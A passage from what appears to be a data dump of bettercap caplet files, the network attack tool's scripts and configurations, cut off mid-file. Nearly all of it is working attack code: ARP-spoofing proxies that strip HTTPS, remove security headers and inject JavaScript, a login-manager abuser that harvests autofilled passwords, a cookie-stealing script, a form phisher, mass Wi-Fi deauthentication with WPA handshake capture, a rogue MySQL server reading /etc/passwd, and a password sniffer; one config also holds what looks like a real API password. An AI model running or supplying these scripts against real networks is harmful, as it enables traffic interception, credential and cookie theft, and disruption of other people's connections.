"")[0])', '        ) {', '          res.Body = res.Body.replace(/<script(\\s|>)/ig, "<div style=\\"display:none;\\"$1");', '          res.Body = res.Body.replace(/<\\/script(\\s|>)/ig, "</div$1");', '          log_debug(on_blue + "hstshijack" + reset + " Blocked inline script tags in a document from " + bold + req.Hostname + reset + ".");', '          break;', '        }', '      }', '', '      /* Inject payloads. */', '      injection = "";', '      for (a = 0; a < Object.keys(payloads).length; a++) {', '        injecting_host = Object.keys(payloads)[a];', '        if (', '             injecting_host == "*"', '          || req.Hostname.match(toWholeRegexpSet(injecting_host, "")[0])', '        ) {', '          injection = injection + payloads[injecting_host];', '        }', '      }', '      if (injection != "") {', '        res.Body = ', '          "<script>\\n" +', '          payload_container_prefix + injection + payload_container_suffix +', '          "</script>\\n" +', '          res.Body;', '        log_debug(on_blue + "hstshijack" + reset + " Injected document from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset);', '      }', '    }', '', '    /* Spoof JavaScript bodies. */', '    if (', '         res.ContentType.match(/\\S+[/]javascript/i)', '      || req.Path.match(/[.]js$/i)', '    ) {', '      res.ReadBody();', '', '      /* Block scripts. */', '      for (a = 0; a < block_script_hosts.length; a++) {', '        if (', '             block_script_hosts[a] === "*"', '          || req.Hostname.match(toWholeRegexpSet(block_script_hosts[a], "")[0])', '        ) {', '          res.Body = "";', '          log_debug(on_blue + "hstshijack" + reset + " Cleared JavaScript resource from " + bold + req.Hostname + reset + ".");', '          break;', '        }', '      }', '', '      /* Inject payloads. */', '      injection = "";', '      for (a = 0; a < Object.keys(payloads).length; a++) {', '        injecting_host = Object.keys(payloads)[a];', '        if (', '             injecting_host == "*"', '          || req.Hostname.match(toWholeRegexpSet(injecting_host, "")[0])', '        ) {', '          injection = injection + payloads[injecting_host];', '        }', '      }', '      if (injection != "") {', '        res.Body = payload_container_prefix + injection + payload_container_suffix + res.Body;', '        log_debug(on_blue + "hstshijack" + reset + " Injected JavaScript file from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset);', '      }', '    }', '', '    /* Strip SSL from location headers. */', '    res.Headers = res.Headers', '      .replace(/(http)s:/ig, "$1:")', '      .replace(/:443($|[^0-9])/g, "$1");', '', '    /* Spoof hosts in headers. */', '    for (a = 0; a < target_hosts.length; a++) {', '      regexp_set = toRegexpSet(target_hosts[a], replacement_hosts[a]);', '      res.Headers = res.Headers.replace(regexp_set[0], regexp_set[1]);', '    }', '', '    /* Remove security headers. */', '    res.RemoveHeader("Strict-Transport-Security");', '    res.RemoveHeader("Content-Security-Policy-Report-Only");', '    res.RemoveHeader("Public-Key-Pins");', '    res.RemoveHeader("Public-Key-Pins-Report-Only");', '    res.RemoveHeader("X-Frame-Options");', '    res.RemoveHeader("X-Content-Type-Options");', '    res.RemoveHeader("X-Download-Options");', '    res.RemoveHeader("X-Permitted-Cross-Domain-Policies");', '    res.RemoveHeader("X-XSS-Protection");', '    res.RemoveHeader("Expect-Ct");', '', '    /* Set insecure headers. */', '    res.SetHeader("Content-Security-Policy", "default-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; worker-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; script-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; connect-src * data: blob: \'unsafe-inline\'; img-src * data: blob: \'unsafe-inline\'; frame-src * data: blob: \'unsafe-inline\'; object-src * data: blob: \'unsafe-inline\'; style-src * data: blob: \'unsafe-inline\'; report-uri x");', '    res.SetHeader("X-WebKit-CSP", "default-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; worker-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; script-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; connect-src * data: blob: \'unsafe-inline\'; img-src * data: blob: \'unsafe-inline\'; frame-src * data: blob: \'unsafe-inline\'; object-src * data: blob: \'unsafe-inline\'; style-src * data: blob: \'unsafe-inline\'; report-uri x");', '    res.SetHeader("X-Content-Security-Policy", "default-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; worker-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; script-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; connect-src * data: blob: \'unsafe-inline\'; img-src * data: blob: \'unsafe-inline\'; frame-src * data: blob: \'unsafe-inline\'; object-src * data: blob: \'unsafe-inline\'; style-src * data: blob: \'unsafe-inline\'; report-uri x");', '    res.SetHeader("Access-Control-Allow-Origin", "*");', '    res.SetHeader("Access-Control-Allow-Methods", "*");', '    res.SetHeader("Access-Control-Allow-Headers", "*");', '    res.SetHeader("Cache-Control", "no-cache, no-store, must-revalidate");', '    res.SetHeader("Expires", "Fri, 20 Apr 2018 04:20:00 GMT");', '    res.SetHeader("Pragma", "no-cache");', '  }', '}', '']
        }]
    }, {
        'path': '/usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap',
        'size': 591,
        'code': ['# targeting the whole subnet by default, to make it selective:', '#', '#   sudo ./bettercap -caplet http-req-dump.cap -eval "set arp.spoof.targets 192.168.1.64"', '', '# to make it less verbose', '# events.stream off', '', '# discover a few hosts ', 'net.probe on', 'sleep 1', 'net.probe off', '', '# uncomment to enable sniffing too', '# set net.sniff.verbose false', '# set net.sniff.local true', '# set net.sniff.filter tcp port 443', '# net.sniff on', '', "# we'll use this proxy script to dump requests", 'set https.proxy.script http-req-dump.js', 'set http.proxy.script http-req-dump.js', 'clear', '', '# go ^_^', 'http.proxy on', 'https.proxy on', 'arp.spoof on'],
        'name': 'http-req-dump/http-req-dump',
        'scripts': [{
            'path': '/usr/share/bettercap/caplets/http-req-dump/http-req-dump.js',
            'size': 6024,
            'code': ['var RESET = "\\033[0m";', '', 'function R(s) {', '    return "\\033[31m" + s + RESET;', '}', '', 'function G(s) {', '    return "\\033[32m" + s + RESET;', '}', '', 'function B(s) {', '    return "\\033[34m" + s + RESET;', '}', '', 'function Y(s) {', '    return "\\033[33m" + s + RESET;', '}', '', 'function BLACK_BLUE(s) {', '    return "\\033[104;30m" + s + RESET;', '}', '', 'function BLACK_RED(s) {', '    return "\\033[41;30m" + s + RESET;', '}', '', 'function DIM(s) {', '    return "\\033[2m" + s + RESET;', '}', '', 'function GREY(s) {', '    return "\\033[30m" + s + RESET;', '}', '', 'function BOLD(s) {', '    return "\\033[1m" + s + RESET;', '}', '', 'function dumpHeaders(req) {', '    headers = req.Headers.replace(/\\r\\n$/g, "").split("\\r\\n");', '', '    msg = "\\n  " + BOLD("Headers") + "\\n\\n";', '', '    for (var i = 0; i < headers.length; i++) {', '        header_name = headers[i].replace(/:.*/, "");', '        header_value = headers[i].replace(/.*?: /, "");', '', '        msg += "    " + G(header_name) + " => " + BOLD(header_value) + "\\n";', '    }', '', '    console.log(msg);', '}', '', 'function dumpPlain(req) {', '    body = req.ReadBody();', '', '    if (req.Body.length > 0) {', '        console.log("  " + BOLD("Text") + "\\n\\n    " + Y(body) + "\\n");', '    }', '}', '', 'function dumpForm(req) {', '    form = req.ParseForm();', '', '    if (Object.keys(form).length > 0) {', '        msg = "  " + BOLD("Form") + "\\n\\n";', '', '        for (var key in form) {', '            msg += "    " + B(strip(key)) + " : " + Y(strip(form[key])) + "\\n";', '        }', '', '        console.log(msg);', '    }', '}', '', 'function dumpQuery(req) {', '    params = req.Query.split("&");', '', '    msg = "  " + BOLD("Query") + "\\n\\n";', '', '    for (var i = 0; i < params.length; i++) {', '        param_name = params[i].split("=")[0];', '        param_value = params[i].split("=")[1];', '', '        if (param_name != undefined && param_value != undefined && param_name.length > 0 && param_value.length > 0) {', '            try {', '                msg += "    " + B(strip(decodeURIComponent(param_name))) + " : " + Y(strip(decodeURIComponent(param_value))) + "\\n";', '            } catch(err) {', '                msg += "    " + B(strip(param_name)) + " : " + Y(strip(param_value)) + "\\n";', '                log_debug("could not decode URI parameter: " + err);', '            }', '        } else {', '            if (params[i].length > 0) {', '                try {', '                    msg += "    " + Y(strip(decodeURIComponent(params[i]))) + "\\n";', '                } catch(err) {', '                    msg += "    " + Y(strip(params[i])) + "\\n";', '                    log_debug("could not decode URI parameter: " + err);', '                }', '            }', '        }', '    }', '', '    console.log(msg);', '}', '', 'function dumpJSON(req) {', '    msg = "  " + BOLD("JSON") + "\\n\\n";', '', '    var body = req.ReadBody();', '', '    if (req.Body.length > 0) {', '        try {', '            json = JSON.parse(body);', '            json_msg = JSON.stringify(json, null, 4);', '', '            msg_lines = json_msg.split("\\n");', '', '            for (var i = 0; i < msg_lines.length; i++) {', '                msg += "    " + msg_lines[i].replace(/^(\\s*)\\{$/,                  "$1" + B("{"))', '                                            .replace(/^(\\s*)\\[$/,                  "$1" + B("["))', '                                            .replace(/^(\\s*)(".*?"): \\{$/,         "$1" + B("$2") + ": " + B("{"))', '                                            .replace(/^(\\s*)(".*?"): \\[$/,         "$1" + B("$2") + ": " + B("["))', '                                            .replace(/^(\\s*)(".*?"): (.*?)(,$|$)/, "$1" + B("$2") + ": " + Y("$3") + "$4")', '                                            .replace(/^(\\s*)(".*?")(,$|$)/,        "$1" + Y("$2") + "$3")', '                                            .replace(/^(\\s*)(\\d*?)(,$|$)/,         "$1" + Y("$2") + "$3")', '                                            .replace(/^(\\s*)\\](,$|$)/,             "$1" + B("]") + "$2")', '                                            .replace(/^(\\s*)\\}(,$|$)/,             "$1" + B("}") + "$2") + "\\n";', '            }', '        } catch(ignore) {', '            msg += "    " + Y(body) + "\\n";', '        }', '', '        console.log(msg);', '    }', '}', '', 'function dumpHex(raw) {', '    var DataSize = raw.length;', '    var Bytes = 16;', '', '    msg = "";', '', '    for (var address = 0; address < DataSize; address++) {', '        var saddr = pad(address, 8, "0");', '        var shex = "";', '        var sprint = "";', '', '        var end = address + Bytes;', '        for (var i = address; i < end; i++) {', '            if (i < DataSize) {', '                shex += toHex(raw.charCodeAt(i)) + " ";', '                sprint += isPrint(raw[i]) ? raw[i] : ".";', '            } else {', '                shex += "   ";', '                sprint += " ";', '            }', '        }', '', '        address = end;', '', '        msg += "    " + G(saddr) + "  " + shex + " " + sprint + "\\n";', '    }', '', '    console.log(msg);', '}', '', 'function dumpRaw(req) {', '    var body = req.ReadBody();', '', '    if (body.length > 0) {', '        console.log("  " + BOLD("Body") + " " + DIM("(" + body.length + " bytes)") + "\\n");', '', '        dumpHex(body);', '    }', '}', '', 'function pad(num, size, fill) {', '    var s = "" + num;', '', '    while (s.length < size) {', '        s = fill + s;', '    }', '', '    return s;', '}', '', 'function strip(s) {', '    return s.replace(/^\\s*/, "").replace(/\\s*$/, "");', '}', '', 'function toHex(n) {', '    var hex = "0123456789abcdef";', '    var h = hex[(0xF0 & n) >> 4] + hex[0x0F & n];', '    return pad(h, 2, "0");', '}', '', 'function isPrint(c) {', '    if (!c) { return false; }', '    var code = c.charCodeAt(0);', '    return (code > 31) && (code < 127);', '}', '', 'function onRequest(req, res) {', '    log("[" + G("http-req-dump") + "] " + BLACK_RED(req.Scheme) + " " + req.Client.IP + " " + BLACK_BLUE(req.Method) + " " + GREY(req.Scheme + "://") + Y(req.Hostname) + req.Path + (req.Query != "" ? GREY("?" + req.Query) : ""));', '', '    dumpHeaders(req);', '', '    if (req.Query.length > 0) {', '        dumpQuery(req);', '    }', '', '    if (req.ContentType.indexOf("text/plain") != -1) {', '        dumpPlain(req);', '    } else if (req.ContentType.indexOf("application/x-www-form-urlencoded") != -1) {', '        dumpForm(req);', '    } else if (req.ContentType.indexOf("application/json") != -1) {', '        dumpJSON(req);', '    } else {', '        dumpRaw(req);', '    }', '}']
        }]
    }, {
        'path': '/usr/share/bettercap/caplets/http-ui.cap',
        'size': 376,
        'code': ['# api listening on http://127.0.0.1:8081/ and ui to http://127.0.0.1', 'set api.rest.address 127.0.0.1', 'set api.rest.port 8081', 'set http.server.address 127.0.0.1', 'set http.server.port 80', '# default installation path of the ui', 'set http.server.path /usr/share/bettercap/ui', '', '# !!! CHANGE THESE !!!', 'set api.rest.username user', 'set api.rest.password pass', '', '# go!', 'api.rest on', 'http.server on'],
        'name': 'http-ui',
        'scripts': []
    }, {
        'path': '/usr/share/bettercap/caplets/https-ui.cap',
        'size': 661,
        'code': ['# api listening on https://0.0.0.0:8083/ and ui on https://0.0.0.0', 'set api.rest.address 0.0.0.0', 'set api.rest.port 8083', 'set https.server.address 0.0.0.0', 'set https.server.port 443', '', "# make sure both use the same https certificate so api requests won't fail", 'set https.server.certificate ~/.bettercap-https.cert.pem', 'set https.server.key ~/.bettercap-https.key.pem ', 'set api.rest.certificate ~/.bettercap-https.cert.pem', 'set api.rest.key ~/.bettercap-https.key.pem ', '# default installation path of the ui', 'set https.server.path /usr/share/bettercap/ui', '', '# !!! CHANGE THESE !!!', 'set api.rest.username noah', 'set api.rest.password haonsb1379', '', '# go!', 'api.rest on', 'https.server on'],
        'name': 'https-ui',
        'scripts': []
    }, {
        'path': '/usr/share/bettercap/caplets/jsinject/jsinject.cap',
        'size': 210,
        'code': ['# Set the path to your JavaScript payload', 'set jsinject.payload jsinject/payloads/form-phisher.js', '', 'set http.proxy.script jsinject/jsinject.js', 'set net.sniff.verbose false', 'net.sniff on', 'http.proxy on', '#arp.spoof on'],
        'name': 'jsinject/jsinject',
        'scripts': [{
            'path': '/usr/share/bettercap/caplets/jsinject/jsinject.js',
            'size': 1850,
            'code': ['var session_id,', '    payload,', '    payload_path,', '    payload_container = "" + ', '    \t"if (!self.{{session_id}}) {\\n" + ', '    \t\t"var {{session_id}} = function() {\\n" + ', '    \t\t\t"{{payload}}\\n" + ', '    \t\t"}\\n" + ', '    \t\t"{{session_id}}();\\n" + ', '    \t"}\\n"', '', 'var green = "\\033[32m",', '    bold  = "\\033[1;37m",', '    reset = "\\033[0m"', '', 'function randomString(length) {', '\tvar chars  = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",', '\t    buffer = ""', '\twhile (buffer.length < length) {', '\t\tindex = parseInt( Math.random() * chars.length )', '\t\tbuffer = buffer + chars.charAt(index)', '\t}', '\treturn buffer', '}', '', 'function configure() {', '\tpayload_path = env["jsinject.payload"].replace(/\\s/g, "")', '\tpayload = readFile(payload_path)', '\tpayload = payload_container.replace("{{payload}}", payload).replace(/\\{\\{session_id\\}\\}/g, session_id)', '}', '', 'function onLoad() {', '\tsession_id = randomString( 4 + parseInt( Math.random() * 16 ) )', '\tconfigure()', '\tlog_info(green + "jsinject" + reset + " started injecting payload " + bold + payload_path + reset + " into HTTP traffic.")', '\tlog_info(green + "jsinject" + reset + " session ID is " + bold + session_id + reset + ".")', '}', '', 'function onResponse(req, res) {', '\tconfigure()', '\tif ( res.ContentType.match(/^text\\/html/i) || req.Path.replace(/\\?.*/, "").match(/\\.(htm|html)$/i) ) {', '\t\tres.ReadBody()', '\t\tlog_debug("(" + green + "jsinject" + reset + ") attempting to inject HTML document from " + bold + req.Hostname + reset + " ...")', '\t\tres.Body = res.Body.replace(/<head>/i, "<head><script>" + payload + "</script>")', '\t}', '\tif ( res.ContentType.match(/^text\\/javascript/i) || res.ContentType.match(/^application\\/javascript/i) || req.Path.replace(/\\?.*/, "").match(/\\.js$/i) ) {', '\t\tres.ReadBody()', '\t\tlog_debug("(" + green + "jsinject" + reset + ") attempting to inject JS document from " + bold + req.Hostname + reset + " ...")', '\t\tres.Body = payload + res.Body', '\t}', '}']
        }]
    }, {
        'path': '/usr/share/bettercap/caplets/local-sniffer.cap',
        'size': 244,
        'code': ['#events.stream off', 'events.clear', '# set events.stream.filter net.sniff', '# events.stream on', '', 'set net.sniff.verbose false', 'set net.sniff.local true', '# https://biot.com/capstats/bpf.html', '# set net.sniff.filter not arp and not udp port 53', '', 'net.sniff on'],
        'name': 'local-sniffer',
        'scripts': []
    }, {
        'path': '/usr/share/bettercap/caplets/login-manager-abuse/login-man-abuse.cap',
        'size': 236,
        'code': ['# targeting the whole subnet by default, to make it selective:', '#', '# sudo ./bettercap -caplet login-man-abuse.cap -eval "set arp.spoof.targets 192.168.1.53"', '', 'set http.proxy.script login-man-abuse.js', 'http.proxy on', 'sleep 1', 'arp.spoof on', '', '', '', ''],
        'name': 'login-manager-abuse/login-man-abuse',
        'scripts': [{
            'path': '/usr/share/bettercap/caplets/login-manager-abuse/login-man-abuse.js',
            'size': 1898,
            'code': ['/*', ' * Ref. ', ' *  - https://github.com/evilsocket/bettercap-proxy-modules/issues/72', ' *  - https://freedom-to-tinker.com/2017/12/27/no-boundaries-for-user-identities-web-trackers-exploit-browser-login-managers/', ' *', ' * The idea:', ' *', ' * - On every html page, inject this invisible form who grabs credentials from login managers.', " * - POST such credentials to /login-man-abuser, given we control the HTTP traffic, we'll intercept this request.", ' * - Intercept request, dump credentials, drop client to 404.', ' */', 'var AbuserJavascript = "";', '', 'function onLoad() {', '    // log( "Loading abuser code from login-man-abuser.js" );', '    AbuserJavascript = readFile("/usr/share/bettercap/caplets/login-manager-abuse/login-man-abuser.js")', '}', '', '// here we intercept the ajax POST request with leaked credentials.', 'function onRequest(req, res) {', '    if( req.Method == \'POST\' && req.Path == "/login-man-abuser" ) {', '        log( "[LOGIN MANAGER ABUSER]\\n", req.ReadBody() );', '        // this was just a fake request we needed to exfiltrate', '        // credentials to us, drop the connection with an empty 200.', '        headers = res.Headers.split("\\r\\n");', '        for (var i = 0; i < headers.length; i++) {', '            header_name = headers[i].replace(/:.*/, "");', '            res.RemoveHeader(header_name);', '        }', '        res.SetHeader("Connection", "close");', '        res.Status      = 200;', '        res.ContentType = "text/html";', '        res.Body        = "";', '    }', '}', '', '// inject the javascript in html pages', 'function onResponse(req, res) {', "    if( res.ContentType.indexOf('text/html') == 0 ){", '        var body = res.ReadBody();', "        if( body.indexOf('</head>') != -1 ) {", '            res.Body = body.replace( ', "                '</head>', ", '                \'<script type="text/javascript">\' + "\\n" +', '                    AbuserJavascript +', "                '</script>' +", "                '</head>'", '            ); ', '        }', '    }', '}']
        }, {
            'path': '/usr/share/bettercap/caplets/login-manager-abuse/login-man-abuser.js',
            'size': 2125,
            'code': ['/*', ' * Ref. ', ' *  - https://github.com/evilsocket/bettercap-proxy-modules/issues/72', ' *  - https://freedom-to-tinker.com/2017/12/27/no-boundaries-for-user-identities-web-trackers-exploit-browser-login-managers/', ' *', ' * The idea:', ' *', ' * - On every html page, inject this invisible form who grabs credentials from login managers.', ' * - POST such credentials to /login-man-abuser, given we control the HTTP traffic, well intercept this request.', ' * - Intercept request, dump credentials, drop client to 404.', ' */', 'var AbuserJavascript = ', 'var injectForm = function(visible) {', 'var container = document.createElement("div");', 'if (!visible){', 'container.style.display = "none";', '}', 'var form = document.createElement("form");', 'form.attributes.autocomplete = "on";', 'var emailInput = document.createElement("input");', 'emailInput.attributes.vcard_name = "vCard.Email";', 'emailInput.id = "email";', 'emailInput.type = "email";', 'emailInput.name = "email";', 'form.appendChild(emailInput);', 'var passwordInput = document.createElement("input");', 'passwordInput.id = "password";', 'passwordInput.type = "password";', 'passwordInput.name = "password";', 'form.appendChild(passwordInput);', 'container.appendChild(form);', 'document.body.appendChild(container);', '};', '', 'var doPOST = function(data) {', 'var xhr = new XMLHttpRequest();', '', 'xhr.open("POST", "/login-man-abuser");', 'xhr.setRequestHeader("Content-Type", "application/json");', 'xhr.onload = function() {', 'console.log("Enjoy your coffee!");', '};', '', 'xhr.send(JSON.stringify(data));', '};', '', 'var sniffInputField = function(fieldId){', 'var inputElement = document.getElementById(fieldId);', 'if (inputElement.value.length){', 'return {fieldId: inputElement.value};', '}', 'window.setTimeout(sniffInputField, 200, fieldId);  // wait for 200ms', '};', '', 'var sniffInputFields = function(){', 'var inputs = document.getElementsByTagName("input");', 'data = {};', 'for (var i = 0; i < inputs.length; i++) {', 'console.log("Will try to sniff element with id: " + inputs[i].id);', 'output = stringsniffInputField(inputs[i].id);', 'data = Object.assign({}, data, output);', '}', 'doPOST(data);', '};', '', 'var sniffFormInfo = function(visible) {', 'injectForm(visible);', 'sniffInputFields();', '};', '', 'sniffFormInfo(false);;']
        }]
    }, {
        'path': '/usr/share/bettercap/caplets/mana.cap',
        'size': 61,
        'code': ['!berate_ap --no-virt --mana --mana-loud wlan1 wlan0 FreeWIFI'],
        'name': 'mana',
        'scripts': []
    }, {
        'path': '/usr/share/bettercap/caplets/massdeauth.cap',
        'size': 302,
        'code': ['set $ {by}{fw}{env.iface.name}{reset} {bold}Â» {reset}', '', '# every 10 seconds deauth every client from every ap', 'set ticker.period 10', 'set ticker.commands clear; wifi.deauth ff:ff:ff:ff:ff:ff', '', '# uncomment to only hop on these channels:', '# wifi.recon.channel 1,2,3', '', 'wifi.recon on', 'ticker on', 'events.clear', 'clear'],
        'name': 'massdeauth',
        'scripts': []
    }, {
        'path': '/usr/share/bettercap/caplets/mitm6.cap',
        'size': 551,
        'code': ["# let's spoof Microsoft and Google ^_^", 'set dns.spoof.domains microsoft.com, google.com', 'set dhcp6.spoof.domains microsoft.com, google.com', '', '# every http request to the spoofed hosts will come to us', "# let's give em some contents", 'set http.server.path www', '', '# serve files', 'http.server on', '# redirect DNS request by spoofing DHCPv6 packets', 'dhcp6.spoof on', '# send spoofed DNS replies ^_^', 'dns.spoof on', '', '# set a custom prompt for ipv6', 'set $ {by}{fw}{cidr} {fb}> {env.iface.ipv6} {reset} {bold}Â» {reset}', '# clear the events buffer and the screen', 'events.clear', 'clear'],
        'name': 'mitm6',
        'scripts': []
    }, {
        'path': '/usr/share/bettercap/caplets/netmon.cap',
        'size': 42,
        'code': ['net.recon on', 'net.probe on', 'clear', 'ticker on'],
        'name': 'netmon',
        'scripts': []
    }, {
        'path': '/usr/share/bettercap/caplets/pita.cap',
        'size': 900,
        'code': ['# More info about this caplet: https://twitter.com/evilsocket/status/1021367629901115392', '', 'set $ {bold}ð Â» {reset}', '', '# make sure wlan0 is in monitor mode', '# ref: https://github.com/offensive-security/kali-arm-build-scripts/blob/master/rpi3-nexmon.sh', '!monstop', '!monstart', '', '# every 5 seconds:', '# - clear the screen', '# - show the list of nearby access points ', '# - deauth every client from each one of them', 'set ticker.period 5', 'set ticker.commands clear; wifi.show; wifi.deauth ff:ff:ff:ff:ff:ff', '# sniff EAPOL frames ( WPA handshakes ) and save them to a pcap file.', 'set net.sniff.verbose true', 'set net.sniff.filter ether proto 0x888e', 'set net.sniff.output wpa.pcap', '', '# uncomment to only hop on these channels:', '# wifi.recon.channel 1,2,3', 'wifi.recon on', 'ticker on', 'net.sniff on', '', "# we'll see lots of probes after each deauth, just skip the noise ...", 'events.ignore wifi.client.probe', '# start fresh', 'events.clear', 'clear', ''],
        'name': 'pita',
        'scripts': []
    }, {
        'path': '/usr/share/bettercap/caplets/proxy-script-test/proxy-script-test.cap',
        'size': 57,
        'code': ['set http.proxy.script proxy-script-test.js', 'http.proxy on'],
        'name': 'proxy-script-test/proxy-script-test',
        'scripts': [{
            'path': '/usr/share/bettercap/caplets/proxy-script-test/proxy-script-test.js',
            'size': 1814,
            'code': ['// called when script is loaded', 'function onLoad() {', '    console.log( "PROXY SCRIPT LOADED" );', '}', '', '// called before a request is proxied', 'function onRequest(req, res) {', '    if( req.Path == "/test-page" ){', '        headers = res.Headers.split("\\r\\n");', '        for (var i = 0; i < headers.length; i++) {', '            header_name = headers[i].replace(/:.*/, "");', '            res.RemoveHeader(header_name);', '        }', '        res.SetHeader("Server", "bettercap");', '        res.SetHeader("Connection", "close");', '        res.Status      = 200;', '        res.ContentType = "text/html";', '        res.Body        = "<html>" +', '                            "<head>" +', '                            "<title>Test Page</title>" +', '                            "</head>" +', '                            "<body>" +', '                                "<div align=\\"center\\">Hello world from bettercap!</div>" + ', '                            "</body>" +', '                           "</html>";', '    }', '}', '', "// called after a request is proxied and there's a response", 'function onResponse(req, res) {', '    if( res.Status == 404 ){', '        headers = res.Headers.split("\\r\\n");', '        for (var i = 0; i < headers.length; i++) {', '            header_name = headers[i].replace(/:.*/, "");', '            res.RemoveHeader(header_name);', '        }', '        res.SetHeader("Server", "bettercap");', '        res.SetHeader("Connection", "close");', '        res.ContentType = "text/html";', '        res.Body        = "<html>" +', '                            "<head>" +', '                            "<title>Test 404 Page</title>" +', '                            "</head>" +', '                            "<body>" +', '                                "<div align=\\"center\\">Custom 404 from bettercap.</div>" + ', '                            "</body>" +', '                           "</html>";', '    }', '}']
        }]
    }, {
        'path': '/usr/share/bettercap/caplets/pwnagotchi-auto.cap',
        'size': 330,
        'code': ['# enable interface monitor mode and define wifi interface to be mon0', 'set wifi.interface mon0', '', '# api listening on http://127.0.0.1:8081/ and ui to http://127.0.0.1', 'set api.rest.address 127.0.0.1', 'set api.rest.port 8081', 'set api.rest.username pwnagotchi', 'set api.rest.password pwnagotchi', 'set api.rest.websocket true', '', '# go!', 'api.rest on'],
        'name': 'pwnagotchi-auto',
        'scripts': []
    }, {
        'path': '/usr/share/bettercap/caplets/pwnagotchi-manual.cap',
        'size': 440,
        'code': ['# enable interface monitor mode and define wifi interface to be mon0', 'set wifi.interface mon0', '', '# api listening on http://0.0.0.0:8081/ and ui to http://0.0.0.0', 'set api.rest.address 0.0.0.0', 'set api.rest.port 8081', 'set http.server.address 0.0.0.0', 'set http.server.port 80', 'set http.server.path /usr/share/bettercap/ui', 'set api.rest.username pwnagotchi', 'set api.rest.password pwnagotchi', 'set api.rest.websocket true', '', '# go!', 'api.rest on', 'http.server on'],
        'name': 'pwnagotchi-manual',
        'scripts': []
    }, {
        'path': '/usr/share/bettercap/caplets/rogue-mysql-server.cap',
        'size': 501,
        'code': ['# set the target for arp spoofing', 'set arp.spoof.targets 192.168.1.236', '', '# bind rogue mysql server to localhost and', '# set the file we want to read', 'set mysql.server.address 127.0.0.1', 'set mysql.server.port 3306', 'set mysql.server.infile /etc/passwd', 'mysql.server on', '', '# set the ip from the mysql server we want to impersonate', 'set tcp.address 93.184.216.34', 'set tcp.port 3306', '', '# set the ip from the rogue mysql server', 'set tcp.tunnel.address 127.0.0.1', 'set tcp.tunnel.port 3306', '', '# go ^_^', 'tcp.proxy on', 'arp.spoof on'],
        'name': 'rogue-mysql-server',
        'scripts': []
    }, {
        'path': '/usr/share/bettercap/caplets/rtfm/rtfm.cap',
        'size': 210,
        'code': ['# targeting the whole subnet by default, to make it selective:', '#', '#   sudo ./bettercap -caplet rtfm.cap -eval "set arp.spoof.targets 192.168.1.64"', '', 'clear', 'set http.proxy.script rtfm.js', 'http.proxy on', 'arp.spoof on'],
        'name': 'rtfm/rtfm',
        'scripts': [{
            'path': '/usr/share/bettercap/caplets/rtfm/rtfm.js',
            'size': 854,
            'code': ['function onRequest(req, res) {', "    req.Path = req.Path.replace('-you-did-not-rtfm', '');", '}', '', 'function onResponse(req, res) {', '    if (res.ContentType.indexOf("text/html") == 0) {', '        var body = res.ReadBody();', '        res.Body = body.replace(', '            /\\.(jpg|jpeg|png|gif|bmp)/gi,', "            '-you-did-not-rtfm.$1'", '        );', '    }', '    else if (res.ContentType.indexOf("image/jpeg") != -1) {', '        headers = res.Headers.split("\\r\\n");', '        for (var i = 0; i < headers.length; i++) {', '            header_name = headers[i].replace(/:.*/, "");', '            res.RemoveHeader(header_name);', '        }', '        res.SetHeader("Connection", "close");', '        res.Status  = 200;', '        res.Body    = readFile("/usr/share/bettercap/caplets/www/rtfm_cat.jpg");', '        log("RTFM! " + req.Hostname + req.Path + ( req.Query ? "?" + req.Query : \'\'));', '    }', '}']
        }]
    }, {
        'path': '/usr/share/bettercap/caplets/simple-passwords-sniffer.cap',
        'size': 131,
        'code': ['set net.sniff.regexp .*password=.+', 'set net.sniff.output passwords.cap', '', '# start arp spoofing attack', '# arp.spoof on', 'net.sniff on', '', '', '', ''],
        'name': 'simple-passwords-sniffer',
        'scripts': []
    }, {
        'path': '/usr/share/bettercap/caplets/steal-cookies/steal-cookies.cap',
        'size': 134,
        'code': ['set steal-cookies.domains /usr/share/bettercap/caplets/steal-cookies/domains.txt', 'set http.proxy.script steal-cookies.js', 'http.proxy on'],
        'name': 'steal-cookies/steal-cookies',
        'scripts': [{
            'path': '/usr/share/bettercap/caplets/steal-cookies/steal-cookies.js',
            'size': 3414,
            'code': ['var victims = {}', '', 'function Rf(s)', '{', '    return "\\033[31m" + s + "\\033[0m"', '}', 'function Rb(s)', '{', '    return "\\033[41m" + s + "\\033[0m"', '}', '', 'function onLoad()', '{', '    log( "Cookies steal module loaded." );', '    log( "targets: " + env[\'arp.spoof.targets\'] );', '}', '', 'function onRequest(req, res)', '{', '    var ip = req.Client.IP,', '        hostname = req.Hostname,', '        headers, cookies', '', '    headers = req.Headers.replace(/\\r\\n$/g, "").split("\\r\\n")', '    for (var i = 0; i < headers.length; i++)', '    {', '        header_name = headers[i].replace(/:.*/, "")', "        if(header_name == 'Cookie')", '            cookies = headers[i].replace(/.*?: /, "");', '    }', '', "    if( req.Query.indexOf('__steal') != -1 )", '    {', '        if(cookies)', '            log( Rb( "[+] " + ip + " - " + hostname + "  " + cookies ) )', '', '        if( victims[ip] && victims[ip].length )', '        {', '            var hostname_index = victims[ip].indexOf(hostname)', '            if( hostname_index != -1 )', '                victims[ip].splice( hostname_index, 1 )', '            ', '            if( victims[ip].length )', "                res.Body = '<html><head></head><body>\\n' +", '                    \'<h2></h2><h3 style="background-color:red"></h3>\\n\' + ', '                    \'<script>document.getElementsByTagName("h2")[0].innerHTML="stealing "+location\\n\' +', '                    \'document.getElementsByTagName("h3")[0].innerHTML=document.cookie</script>\\n\' +', '                    \'<script>document.location="http://\' + victims[ip][0] + \'/?__steal"</script>\\n\' +', "                    '</body></html>'", '            else', "                res.Body = 'end stealing'", '            res.Status      = 200', '            res.ContentType = "text/html"', '            res.Headers     = "Connection: close"', '        }', '    }    ', '}', '', 'function onResponse(req, res)', '{', "    if( res.ContentType.indexOf('text/html') == 0 )", '    {', '        var body = res.ReadBody(),', '            ip = req.Client.IP', '', '        